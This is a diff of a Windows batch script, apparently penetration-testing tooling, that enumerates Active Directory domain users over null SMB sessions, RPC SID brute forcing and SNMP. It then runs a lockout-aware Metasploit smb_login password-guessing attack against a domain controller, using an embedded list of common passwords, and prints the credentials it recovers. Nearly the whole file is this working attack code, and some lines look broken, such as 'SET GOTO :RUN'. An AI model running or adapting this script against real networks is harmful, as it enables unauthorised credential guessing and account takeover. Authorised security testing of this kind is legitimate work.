@@ -8,31 +8,50 @@ REM # Script Name: Get Domain Users (GDU)
 REM # Author: Scott Sutherland (nullbind) <scott.sutherland@netspi.com>
 REM #
 REM # Description:
-REM # This script is intended to automated the following tasks:
-REM # 1) Determine domain from IPCONFIG
-REM	# 2) Identify domain controllers via DNS
-REM # 3) Enumerate users via RCP endpoints with Dumpsec
-REM # 4) Enumerate users via RCP endpoints with Enum -U
-REM # 5) Enumerate users via RCP endpoints with Enum -N
-REM # 6) Enumerate users via RCP SID Brute force with Metasploit
-REM # 7) Enumerate users via SNMP default strings with Metasploit
-REM # 8) Conduct short dictionary attack against users with Metasploit
+REM # This script is intended to automate Windows domain user 
+REM # enumeration using multiple methods, and initiate a 
+REM # dictionary attack against the accounts with respect to the 
+REM # acccount lockout policy.
 REM #
-REM # Users can authenticate with one of three options during attack:
+REM # Technical Summary:
+REM # 1) Determine domain from IPCONFIG (option provided to override)
+REM	# 2) Identify domain controllers via DNS server queries
+REM # 3) Enumerate users via RCP endpoints with Dumpsec
+REM # 4) Enumerate users via RCP endpoints with Enum
+REM # 5) Enumerate users via RCP SID Brute forcing with the Metasploit
+REM #    smb_lookupsid module
+REM # 6) Enumerate users via SNMP default strings with the Metasploit
+REM #    snmp_enumusers module
+REM # 7) Enumerate password policy with Dumpsec
+REM # 8) Conduct dictionary attack using top 20 rockyou password list 
+REM #    against enumerated users with Metasploit smb_login module 
+REM #    with respect to the password policy
+REM #		
+REM # Authentication Methods:
+REM # Users can authenticate with one of three options during attack.
 REM # 1) Null SMB Login
 REM # 2) Trusted connection
 REM # 3) Username and password
+REM #
+REM # Notes:
+REM # 1) If no lockout policy exists, the dictionary attack will be 
+REM #    aborted so it can be manually confirmed
+REM # 2)If the lockout policy cannot be determined the dicitonary
+REM #    attack will be aborted
 REM #################################################################
 
 
 REM -----------------------------------------------------------------
 REM TODO
 REM -----------------------------------------------------------------
-REM WRITE Thoroughness swith (stop at first server that gives data vs all)
-REM WRITE POLICY DUMP CODE
-REM WRITE POLICY TIMEING INTO DICTIONARY ATTACK
-REM Add switch for custom domain
-REM Add check for required executables before running
+REM - fix width of header to match longest lengh of text
+REM - make inprogress password display pretty 
+REM - add gda option that supports auth
+REM - dumpsec - on first success stop and move on
+REM - enum - on first success stop and move on
+REM - add express option (stops after first successfull enumeration)
+REM - Add check for required executables before running
+REM - add null base/bind to ldap to run when null smb login session runs
 REM -----------------------------------------------------------------
 
 
@@ -45,41 +64,52 @@ SET metasploitpath="C:\metasploit\"
 SET enumpath="C:\Penetration Testing\Enum+\Enum+\enum.exe"
 SET dumpsecpath="C:\Program Files (x86)\SystemTools\dumpsec.exe"
 
-REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)
-REM ## Example: SET custom_domain=netspi.local 
-SET custom_domain=netspi.local
-
 REM ## SETUP AUTHENTICATION VARIABLES
 SET netuse_auth="" /user:""
 SET enumauth=
 
+REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)
+REM ## Example: SET custom_domain=company.local
+IF [%2] equ [-c] SET custom_domain=%3
+IF [%6] equ [-c] SET custom_domain=%7
+
 REM ## SETUP COMMAND LINE SWITCHES
 IF [%1] equ [] goto :SYNTAX
+IF [%1] equ [-g] goto :GETGROUPSESS
 IF [%1] equ [-n] goto :NULLSESSION
 IF [%1] equ [-a] goto :AUTHENTICATE
 IF [%1] equ [-t] goto :TRUSTEDCON
 
 
 :SYNTAX
-ECHO ------------------------------------------------------------
-ECHO                 GET DOMAIN USERS (GDU)
-ECHO ------------------------------------------------------------
-ECHO This script can be used to enumerate users that exist
-ECHO in the domain associated with the DHCP server.  By default,
-ECHO the script will use a null session to attempt to enumerate
-ECHO information. 
-ECHO ------------------------------------------------------------
-ECHO Syntax: 
-ECHO -n run the script with null smb login
-ECHO -t run the script with a trusted connection (current user)
-ECHO -a run script as an authenticated user
-ECHO -u user name to authenticate with
-ECHO -p password to authenticate with
-ECHO ------------------------------------------------------------
-ECHO Examples:
-ECHO    null connection: gdu -n 							
-ECHO trusted connection: gdu -t
-ECHO  custom connection: gdu -a -u "domain\user" -p password
+ECHO ------------------------------------------------------------------------------------
+ECHO                                GET DOMAIN USERS (GDU)
+ECHO ------------------------------------------------------------------------------------
+ECHO  This script is intended to automate Windows domain user enumeration using multiple 
+ECHO  methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a 
+ECHO  dictionary attack against enumerated accounts under the constraints of the acccount 
+ECHO  lockout policy. 
+ECHO ------------------------------------------------------------------------------------
+ECHO  Syntax: gdu [options]
+ECHO.
+ECHO   -n run the script with null smb login
+ECHO   -t run the script with a trusted connection (current user)
+ECHO   -a run script as an authenticated user
+ECHO   -u user name to authenticate with
+ECHO   -p password to authenticate with
+ECHO   -c custom domain
+ECHO ------------------------------------------------------------------------------------
+ECHO  Examples (basic):
+ECHO. 
+ECHO   gdu -n 							
+ECHO   gdu -t
+ECHO   gdu -a -u "domain\user" -p password
+ECHO.
+ECHO  Examples (custom domain):
+ECHO.
+ECHO   gdu -n -c domain.com							
+ECHO   gdu -t -c domain.com
+ECHO   gdu -a -u "domain\user" -p password -c domain.com
 GOTO :END
 
 :AUTHENTICATE
@@ -101,20 +131,22 @@ IF %attack% equ y set attack=Y && GOTO :DHCP
 IF %attack% equ Y GOTO :DHCP
 SET attack=N && GOTO :DHCP
 
-
 :DHCP
 REM ## DISPLAY BANNER
 cls
-ECHO ------------------------------------------------------------
-ECHO -                                                          -
-ECHO -                  GET DOMAIN USERS (GDU)                  -
-ECHO -                                                          -
-ECHO ------------------------------------------------------------
-ECHO                   Enumerating Domain Users                 
-ECHO ------------------------------------------------------------
+ECHO ------------------------------------------------------------------------------------
+ECHO -                                                          						-
+ECHO -                              GET DOMAIN USERS (GDU)                 			    -
+ECHO -                                                          						-
+ECHO ------------------------------------------------------------------------------------
+ECHO                               Enumerating Domain Users                 
+ECHO ------------------------------------------------------------------------------------
 REM -------------------------------------------------------
 REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION
 REM -------------------------------------------------------
+IF [%1] equ [-n] ECHO  [*]    INFO: Authentication method = NULLSESSION
+IF [%1] equ [-a] ECHO  [*]    INFO: Authentication method = AUTHENTICATED USER
+IF [%1] equ [-t] ECHO  [*]    INFO: Authentication method = TRUSTED CONNECTION
 IF %attack% equ N ECHO  [*]    INFO: Dictionary attack DISABLED
 IF %attack% equ Y ECHO  [*]    INFO: Dictionary attack ENABLED
 ECHO  [*]  ACTION: Getting domain from DHCP configuration...
@@ -126,8 +158,9 @@ IF EXIST target del target
 
 REM ## SETUP CUSTOM DOMAIN IF VARIABLE HAS BEEN SET
 IF [%target_domain%] equ [] ECHO  [-]  RESULT: FAILED && GOTO :END
-ECHO  [*]  RESULT: %target_domain%
+
 IF [%custom_domain%] neq [] SET target_domain=%custom_domain% 
+ECHO  [*]  RESULT: %target_domain%
 
 REM ## CHECKING TOTAL NUMBER OF WORDS IN A DOMAIN AND SAVE AS TOTALVAR 
 IF EXIST num_words del num_words
@@ -163,6 +196,15 @@ ECHO  [*]  ACTION: Getting list of DCs from DNS...
 
 REM ## ENUMERATE DOMAIN CONTROLLERS
 nslookup -type=SRV _ldap._tcp.%target_domain% 2>nul| find /I "internet address" | gawk -F " " "{print $5}" | uniq | sort > dcs.txt 2> NUL 
+
+REM ## CHECK IF DOMAIN CONTROLLERS ARE UP
+for /F "tokens=*" %%i in ('cat dcs.txt') do ping -n 2 %%i | grep -i "reply" | grep -i "bytes=" | gawk -F " " "{print $3}"| sed s/://g | uniq >> dcs_live.txt
+
+REM ## UPDATE DC LIST
+sort dcs_live.txt>dcs.txt
+
+REM ## REMOVE TEMP FILE
+IF EXIST dcs_live.txt DEL dcs_live.txt
 
 REM ## GET DOMAIN CONTROLLER COUNT
 wc -l dcs.txt | sed s/dcs.txt//g | sed -e "s/^[ \]*//" > dc_count
@@ -340,8 +382,35 @@ SET /P mypwd=<pwd2.txt
 IF EXIST pwd.txt del pwd.txt
 IF EXIST pwd2.txt del pwd2.txt
 
-REM ## GET LIST OF USERS
-Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dcs.txt E 2> nul 1>> usrtmp.txt
+copy dcs.txt dclist.txt 2>nul 1>nul
+
+:runsid
+REM ## SETUP NEXT SCAN
+head -n 1 dclist.txt > dc_target.txt
+head -n 1 dclist.txt >> dcs_scanned.txt
+diff -iw -d dclist.txt dcs_scanned.txt | grep -i "<" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" > dclist.txt
+
+REM ## GET LIST OF USERS for first server
+Ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_lookupsid THREADS=15 MaxRID=10000 SMBDomain=. RHOSTS=file:%mypwd%\\dc_target.txt E 2> nul 1>> usrtmp.txt
+
+REM ## CHECK IF SUCCESSFUL
+grep -i "user=" usrtmp.txt | wc -l | sed -e "s/^[ \]*//" > dc_success
+SET /P dc_success=<dc_success
+IF %dc_success% GEQ 1 GOTO :runsidcomplete
+
+REM ## GET LINE COUNT of dclist.txt
+wc -l dclist.txt  | sed s/dclist.txt //g | sed -e "s/^[ \]*//" > dc_pending_count
+SET /P dc_pending_count=<dc_pending_count
+
+REM IF dclist.txt IS NOT EMPTY TRY NEXT DC
+IF %dc_pending_count% GEQ 1 GOTO :runsid
+
+:runsidcomplete
+REM ## CLEAN  UP TEMP FILES
+IF EXIST dclist.txt DEL dclist.txt
+IF EXIST dc_target.txt DEL dc_target.txt
+IF EXIST dcs_scanned.txt DEL dcs_scanned.txt
+IF EXIST dc_success DEL dc_success
 
 REM ## PARSE CLEAN LIST OF USERS
 grep -i "user=" usrtmp.txt | gawk -F " " "{print $3}" | gawk -F "USER=" "{print $2}" | grep -v "\$" |gawk "!/\$/" | sort | uniq 2>nul 1> allusers.txt
@@ -387,16 +456,61 @@ REM ## CHECK IF USER WANTS AUTO DICTIONARY ATTACK
 IF %attack% equ N GOTO :END
 
 REM ## ATTACK IF USERS WHERE ENUMERATED & Dictionary attack is requested
-GOTO :DATTACK
+GOTO :GETPOLICY
+
+
+:GETPOLICY	
+REM ## CHECK IF AUTOMATED DICTIONARY ATTACK IS ENABLED
+IF %attack% equ N GOTO :END
+
+REM -------------------------------------------------------
+REM  ENUMERATE PASSWORD POLICY FROM DOMAIN CONTROLLER
+REM -------------------------------------------------------
+REM ECHO  [*]  ACTION: Attempting policy enumeration with DUMPSEC...
+
+REM ## GET LOCKOUT POLICY
+%dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2> nul
+grep -i "Lockout after " pwpolicy.txt | sed s/"Lockout after"//g | sed s/"bad logon attempts"//g | grep -v "^$" | sed -e "s/^[ \]*//">lockout
+
+REM ## GET COUNT RESET
+grep -i "Reset bad logon count after 15 minutes" pwpolicy.txt | gawk -F " " "{print $6}" | grep -v "^$" | sed -e "s/^[ \]*//" >countreset
+
+REM ## SETUP VARIABLES
+set /P countreset=<countreset
+set /P lockoutafter=<lockout
+set /A attempts=%lockoutafter%-2
+
+REM ## CLEAN UP TEMP FILES
+IF EXIST pwpolicy.txt DEL pwpolicy.txt 
+IF EXIST lockout DEL lockout
+IF EXIST countreset DEL countreset
+
+REM ## IF NO PASSWORD POLICY EXISTS ABORT DICTIONARY ATTACK - needs to be tested
+IF %lockoutafter% EQU 0 ECHO  [*]   RESULT: No password policy exist, please confirm and attack manually!
+IF %lockoutafter% EQU 0 ECHO  [*]   RESULT: Automated dictionary attack aborted! && GOTO :END
+
+REM ## IF SUCESSFULL ELSE GOTO END
+IF %attempts% GEQ 1 GOTO :DATTACK
+ECHO  [*]   RESULT: Password policy could not be determined!
+ECHO  [*]   RESULT: Automated dictionary attack aborted!
+GOTO :END
 
 
 :DATTACK
 REM -------------------------------------------------------
 REM ATTEMPT DICTIONARY ATTACK AGAINST DC
 REM -------------------------------------------------------
-ECHO ------------------------------------------------------------
-ECHO                   Starting Dictionary Attack 
-ECHO ------------------------------------------------------------
+ECHO ------------------------------------------------------------------------------------
+ECHO                                Starting Dictionary Attack 
+ECHO ------------------------------------------------------------------------------------
+REM ## GET DATE
+FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i
+
+REM ## GET TIME
+FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i
+
+REM ## PRINT START TIME
+ECHO  [*]    INFO: START TIME is %mydate% %mytime%
 
 REM ## COMBINE USER LISTS
 cat domain_users*.txt | sort | uniq 2>nul 1>allusers.txt
@@ -409,20 +523,66 @@ REM ## REMOVE TEMP FILES
 IF EXIST user_count del user_count
 
 REM ## GENERATE DICTIONARY FILE FOR ATTACK
-REM ## NOTE: Blank password and username as password 
-REM ## are default options in the smb_login module
-ECHO  [*]  ACTION: Generating password file list...
-IF EXIST passwords.txt DEL passwords.txt
-touch passwords.txt
-ECHO Password1 >> passwords.txt
-
+REM ## NOTE: Some of the psswords below should be changed manually
+REM ##       but mainly its rocku.  Also, blank and username as pass
+REM ##       will be done via the smb_login module.
+IF EXIST list_pending.txt DEL list_pending.txt
+touch list_pending.txt
+ECHO companyname>> list_pending.txt
+ECHO Companyname>> list_pending.txt
+ECHO !!getitdone!!>> list_pending.txt
+REM ECHO Companyname1>> list_pending.txt
+REM ECHO companyname1>> list_pending.txt
+REM EcHO Companyname12>> list_pending.txt
+REM EcHO companyname12>> list_pending.txt
+REM ECHO Password>> list_pending.txt
+REM ECHO password>> list_pending.txt
+REM ECHO Password1>> list_pending.txt
+REM ECHO password1>> list_pending.txt
+REM ECHO P@ssw0rd1>> list_pending.txt
+REM ECHO Password12>> list_pending.txt
+REM ECHO password123>> list_pending.txt
+REM ECHO Password123>> list_pending.txt
+REM ECHO 12345>> list_pending.txt
+REM ECHO 123456>> list_pending.txt
+REM ECHO 654321>> list_pending.txt
+REM ECHO 1234567>> list_pending.txt
+REM ECHO 12345678>> list_pending.txt
+REM ECHO 123456789>> list_pending.txt
+REM ECHO 1234asdf>> list_pending.txt
+REM ECHO Summer2011>> list_pending.txt
+REM ECHO Fall2011>> list_pending.txt
+REM ECHO Winter2011>> list_pending.txt
+REM ECHO Winter2012>> list_pending.txt
+REM ECHO Spring2012>> list_pending.txt
+REM ECHO qwerty>> list_pending.txt
+REM ECHO Qwerty>> list_pending.txt
+REM ECHO abc123>> list_pending.txt
+REM ECHO letmein>> list_pending.txt
+REM ECHO opensesme>> list_pending.txt
+REM ECHO monkey>> list_pending.txt
+REM ECHO Monkey>> list_pending.txt
+REM ECHO myspace1>> list_pending.txt
+REM ECHO link182>> list_pending.txt
+REM ECHO liverpool>> list_pending.txt
+REM ECHO iloveyou>> list_pending.txt
+REM ECHO rockyou>> list_pending.txt
+REM ECHO princess>> list_pending.txt
+REM ECHO thomas>> list_pending.txt
+REM ECHO Nicole>> list_pending.txt
+REM ECHO Daniel>> list_pending.txt
+REM ECHO babygirl>> list_pending.txt
+REM ECHO michael>> list_pending.txt
+REM ECHO Ashley>> list_pending.txt
+REM ECHO yuiop>> list_pending.txt
+ 
 REM ## Get number of passwords to be used
-wc -l passwords.txt | sed -e "s/^[ \]*//" | sed s/passwords.txt//g> pwcount
+wc -l  list_pending.txt | sed -e "s/^[ \]*//" | sed s/list_pending.txt//g> pwcount
 SET /P pwcount=<pwcount
 IF EXIST pwcount del pwcount
 
 REM ## add 2 to pwcount; 1 blank;1 username as pw (built into smb_login)
-SET /a pwcount=%pwcount%+2 
+SET /A pwcount=%pwcount%+2 
 
 REM ## GET PRESENT WORKING DIRECTORY
 pwd > pwd.txt
@@ -430,8 +590,9 @@ SET /P mydir=<pwd.txt
 IF EXIST pwd.txt DEL pwd.txt
 
 REM ## MODIFY PATH FOR METASPLOIT
-echo %mydir% | sed s/\\/\\\\/g > pwd.txt
+echo %mydir%| sed s/\\/\\\\/g > pwd.txt
 SET /P mydir=<pwd.txt
+
 IF EXIST pwd.txt DEL pwd.txt
 
 REM ## GET TARGET DC
@@ -440,18 +601,68 @@ set /p targetdc=<targetdc.txt
 IF EXIST targetdc.txt del targetdc.txt
 
 REM ## PRINT DICTIONARY CONFIGURATION INFO
-ECHO  [*]  ACTION: %targetdc% loaded as target
-ECHO  [*]  ACTION: %pwcount% passwords loaded 
-ECHO  [*]  ACTION: %user_count%users loaded
+ECHO  [*]    INFO: %targetdc% loaded as target
+ECHO  [*]    INFO: %pwcount% passwords loaded 
+ECHO  [*]    INFO: %user_count%users loaded
+ECHO  [*]    INFO: %lockoutafter% attempts can be made before accounts lockout
+ECHO  [*]    INFO: %countreset% is the lockout counter reset time
+ECHO  [*]    INFO: %attempts% passwords will be tested every %countreset% minutes
 ECHO  [*]  ACTION: Starting dictionary attack (takes a while)...
 
+REM ## EXECUTE DICTIONARY ATTACK WITH BLANK PASSWORD AND USERNAME AS PASSWORD
+ECHO  [*]  ACTION: Testing for blank passwords and username as password...
+ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=TRUE USER_AS_PASS=TRUE USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt
+
+REM ## SHOW AQUIRED PASSWORDS FOR ROUND
+ECHO  [*]  ACTION: Potentially recover passwords:
+grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
+FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
+IF EXIST tmp_list.txt DEL tmp_list.txt
+
+REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
+ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
+sleep %countreset%m
+
+:RUN
+REM ## SETUP PASSWORD FILES FOR SCAN
+head -n %attempts% list_pending.txt > list_targets.txt
+head -n %attempts% list_pending.txt >> list_scanned.txt
+diff -iw -d list_pending.txt list_scanned.txt | grep -i "<" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" > list_pending.txt
+
+REM ## DISPLAY PASSWORDS TO BE TESTED
+ECHO  [*]  ACTION: Testing the %attempts% passwords below:
+FOR /F "tokens=*" %%i in ('cat list_targets.txt') do ECHO  [*]          Pasword: %%i
+
 REM ## EXECUTE DICTIONARY ATTACK
-ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=5 BLANK_PASSWORDS=true USER_AS_PASS=true PASS_FILE=%mydir%\\passwords.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1> creds.txt
+ruby c:\metasploit\msf3\msfcli auxiliary/scanner/smb/smb_login THREADS=15 BLANK_PASSWORDS=FALSE USER_AS_PASS=FALSE PASS_FILE=%mydir%\\list_targets.txt USER_FILE=%mydir%\\allusers.txt SMBDomain=. RHOSTS=%targetdc% E 2> nul 1>> creds.txt
+
+REM ## SHOW AQUIRED PASSWORDS FOR ROUND
+ECHO  [*]  ACTION: Potentially recover passwords:
+grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 } >>tmp_list.txt
+FOR /F "tokens=*" %%i in ('type tmp_list.txt') do echo ECHO  [*] Account:%%i 
+IF EXIST tmp_list.txt DEL tmp_list.txt
+
+REM ## SLEEP FOR NUMBER OF MINUTES DEFINED BY PASSWORD POLICY
+ECHO  [*]  ACTION: Waiting for counter to reset (%countreset% minutes)...
+sleep %countreset%m
+
+REM ## GET LINE COUNT OF LIST_PENDING.TXT
+wc -l list_pending.txt | sed s/list_pending.txt//g | sed -e "s/^[ \]*//" > line_count
+SET /P line_count=<line_count
+
+REM IF LIST_PENDING.TXT IS NOT EMPTY TRY NEXT GROUP OF PASSWORDS
+IF %line_count% GEQ 1 SET GOTO :RUN
+IF %line_count% EQU 0 ECHO  [*]  ACTION: Dictionary attack completed.
+
+REM ## CLEAN UP TEMP FILES
+IF EXIST list_pending.txt DEL list_pending.txt
+IF EXIST list_targets.txt DEL list_targets.txt
+IF EXIST list_scanned.txt DEL list_scanned.txt
+IF EXIST line_count DEL line_count
 
 REM # PARSE RECOVERED USERSNAME AND PASSWORDS
 grep -I "SUCCESSFUL LOGIN" creds.txt | sed s/'//g | sed s/445//g| gawk -F " " "{print $2$13$14$15 }" > domain_passwords.txt
 IF EXIST creds.txt del creds.txt
-IF EXIST domain_passwords.txt SET /P creds=< domain_passwords.txt
 
 REM ## GET NUMBER CREDENTIALS
 wc -l domain_passwords.txt | sed -e "s/^[ \]*//" | sed s/domain_passwords.txt//g>cred_count
@@ -463,34 +674,27 @@ IF EXIST cred_count del cred_count
 REM ## CHECK FOR FAILURE
 IF %cred_count% EQU 0 ECHO  [*]  RESULT: No weak passwords were found && goto :END
 
-
-REM ## COUNT NUMBER OF CREDETIALS RECOVERED
-wc -l domain_passwords.txt > pw_count.txt
-SET /P pw_count=<pw_count.txt
-
-REM ## REMOVE TEMP FILES
-IF EXIST pw_count.txt del pw_count.txt
-
 REM ## PRINT NUMBER OF CREDETIALS RECOVERED
-ECHO  [*]   RESULT: %pw_count% passwords were found
+ECHO  [*]   RESULT: %cred_count% passwords were found
 
 REM ## PRINT CREDENTIALS
 FOR /F "tokens=*" %i in ('type domain_passwords.txt') do ECHO  [*]  ACCOUNT:%%i
 
-REM ## ENUMERATE ACTIVE DOMAIN ADMIN SESSIONS
-REM authenticate to dc and get full dc list
-REM authenticate to dc and get domain/enterprise admins list
-REM check if user is domain admin 
-REM authenticate as domain user to each dc - net use
-REM get session from each dc NetSess.exe -h 192.168.73.25
-REM cross referance and spit out list of IPS / domain admins
+REM ## GET DATE
+FOR /F "tokens=*" %%i in ('date /t') do SET mydate=%%i
 
+REM ## GET TIME
+FOR /F "tokens=*" %%i in ('time /t') do SET mytime=%%i
+
+REM ## PRINT THE END TIME
+ECHO  [*]    INFO: END TIME is %mydate% %mytime%
 
 :END
-ECHO ------------------------------------------------------------
-REM ## CLEANUP FILES
-IF EXIST passwords.txt del passwords.txt
+ECHO ------------------------------------------------------------------------------------
+REM ## CLEAN UP FILES
+IF EXIST list_pending.txt del list_pending.txt
 IF EXIST dcs.txt del dcs.txt
+move allusers.txt domain_users_all.txt 2>nul 1>nul
 
 REM ## REMOVE PROTOCOL USER ENUMERATION FILES
 IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('dir /b domain_user*') do IF EXIST %%i DEL %%i
@@ -498,16 +702,32 @@ IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('dir /b domain_user*') do IF EXIST %%
 REM ## CLEAN UP SMB CONNECTIONS
 IF EXIST dcs.txt FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ /del 2>nul 1>nul
 
+REM ## CLEAN UP VARIABLES
+set attack=
+set attempts=
+set countreset=
+set cred_count=
+set creds=
+set custom_domain=
+set dc_count=
+set domain_parameter=
+set dumpsecpath=
+set enumauth=
+set enumpath=
+set lockoutafter=
+set metasploitpath=
+set mydir=
+set mypwd=
+set netuse_auth=
+set pw_count=
+set pwcount=
+set success=
+set target_domain=
+set targetdc=
+set temp_var=
+set totalvar=
+set unixtoolspath=
+set user_count=
+set var1=
+set var2=
 
-:POLICY
-REM -------------------------------------------------------
-REM Run enum to enumerate account policies
-REM -------------------------------------------------------
-REM ECHO  [*]  ACTION: Attempting policy enumeration with ENUM...
-REM enum "c:\Penetration Testing\Enum+\Enum+\enum.exe" -P %%i >> policy.txt
-REM ECHO  [*]  ACTION: Attempting policy enumeration with DUMPSEC...
-REM %dumpsecpath% /computer=\\%mydc% /rpt=policy /saveas=csv /outfile=pwpolicy.txt 2> nul
-REM grep -i "Lockout after " pwpolicy.txt | sed s/"Lockout after"//g | sed s/"bad logon attempts"//g | sed -e "s/^[ \]*//">lockout
-REM IF EXIST pwpolicy.txt del pwpolicy.txt 
-REM set /P lockout=<lockout
-REM del lockout
